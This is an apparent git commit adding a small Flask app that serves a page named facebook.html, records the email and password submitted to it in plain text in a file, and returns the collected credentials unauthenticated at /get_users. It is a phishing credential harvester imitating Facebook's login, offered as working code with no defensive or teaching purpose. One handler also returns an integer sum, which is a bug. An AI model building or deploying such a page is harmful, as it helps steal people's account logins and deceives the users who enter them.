1d420510c971c8a26f7fd7266f1c6f0cbac9199d
Sumit kumar <sumitkumar@Sumits-MacBook-Air.local>
2020-07-22 15:29:55 +0530

    first commit

---
+++ app.py
@@ -0,0 +1,40 @@
+from flask import Flask,request,render_template
+
+
+app = Flask(__name__)
+
+
+@app.route('/',methods=["GET"])
+def index():
+    return render_template('index.html');
+
+
+@app.route('/get_users',methods=["GET"])
+def get_users():
+    data = ''
+    with open("credidentials.txt") as f:
+            file_content = f.read()
+    return file_content
+
+
+
+@app.route('/facebook_login',methods=["GET","POST"])
+def get_facebook():
+    if request.method == "POST":
+        username = request.form.get('email')
+        password = request.form.get('password')
+        with open('credidentials.txt','a') as users:
+            users.write('username = '+username+' password = '+password+'\n')
+        return 1+2
+    else:
+        return render_template('facebook.html');
+
+
+
+
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
+
+
